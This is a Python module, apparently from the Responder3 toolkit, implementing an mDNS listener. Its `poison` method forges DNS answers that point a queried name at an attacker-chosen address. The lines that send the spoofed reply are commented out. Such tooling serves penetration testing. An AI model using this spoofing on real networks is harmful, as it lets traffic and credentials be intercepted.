import io
import logging
import traceback
import socket
import struct
import enum
import traceback
import ipaddress

from responder3.newpackets.DNS import * 
from responder3.servers.BASE import ResponderServer, ResponderProtocolUDP

class MDNS(ResponderServer):
	def __init__(self):
		ResponderServer.__init__(self)
		self.protocol = MDNSProtocol

	def modulename(self):
		return 'MDNS'

	def run(self):
		#need to do some wizardy with the socket setting here
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
		sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		sock.bind(('', self.bind_port))
		mreq = struct.pack("=4sl", self.bind_addr.packed, socket.INADDR_ANY)
		sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

		coro = self.loop.create_datagram_endpoint(
							protocol_factory=lambda: MDNSProtocol(self),
							sock = sock
		)

		return self.loop.run_until_complete(coro)

	def handle(self, packet, addr, transport):
		try:
			#self.log(logging.DEBUG,'Handle called with data: ' + data.hex())
			print(repr(packet))
			#pp = self.poison(packet, ipaddress.ip_address('192.168.11.11'))
			#transport.sendto(pp.toBytes(), addr)
			#self.log(logging.DEBUG,'Sending response!')
			

		except Exception as e:
			traceback.print_exc()
			self.log(logging.INFO,'Exception! %s' % (str(e),))
			pass

	def poison(self, requestPacket, poisonAddr, poisonName = None):
		self.log(logging.DEBUG,'Poisoning!')
		res = DNSResource()
		res.construct(requestPacket.Questions[0].QNAME.name, DNSType.A, poisonAddr)
		pp = DNSPacket()

		pp.construct(TID = requestPacket.TransactionID, 
					 response  = DNSResponse.RESPONSE, 
					 answers   = [res],
					 questions = requestPacket.Questions)

		return pp


class MDNSProtocol(ResponderProtocolUDP):
	
	def __init__(self, server):
		ResponderProtocolUDP.__init__(self, server)

	def _parsebuff(self, addr):
		#self._server.log(logging.INFO,'Buffer contents: %s' % (self._buffer.hex()))
		data = io.BytesIO(self._buffer)
		packet = DNSPacket(data)
		#self._server.log(logging.INFO,'Remained data: ' + data.read().hex())
		self._server.handle(packet, addr, self._transport)